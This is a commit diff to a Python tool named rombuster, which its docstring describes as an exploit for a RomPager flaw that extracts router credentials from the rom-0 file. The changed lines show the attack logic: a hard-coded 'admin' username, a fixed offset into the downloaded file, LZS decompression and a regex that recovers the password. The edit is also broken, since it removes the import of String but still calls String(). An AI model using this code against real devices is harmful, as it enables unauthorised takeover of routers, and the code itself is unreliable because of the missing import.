1eabaa7ada4439b3f4a1b679aec70a829c40521a
Ivan Nikolskiy <enty8080@gmail.com>
2024-07-18 01:14:13 +0200

    Update __main__.py

--- rombuster/__main__.py
+++ rombuster/__main__.py
@@ -22,24 +22,19 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """
 
-import http.client
 import re
 import requests
-from pex.string import String
 
 from .trigger import Trigger
 
 
-class RomBuster(String):
+class RomBuster(object):
     """ Main class of rombuster module.
 
     This main class of rombuster module is intended for providing
     an exploit for RomPager vulnerability that extracts credentials
     from the obtained rom-0 file.
     """
-
-    def __init__(self) -> None:
-        super().__init__()
 
     def exploit(self, address: str) -> tuple:
         """ Exploit the vulnerability in RomPager and extract credentials.
@@ -57,7 +52,7 @@ class RomBuster(String):
 
             username = 'admin'
             data = response.content[8568:]
-            result = self.lzs_decompress(data)
+            result = String().lzs_decompress(data)
 
             password = re.findall("([\040-\176]{5,})", result)
             if len(password):
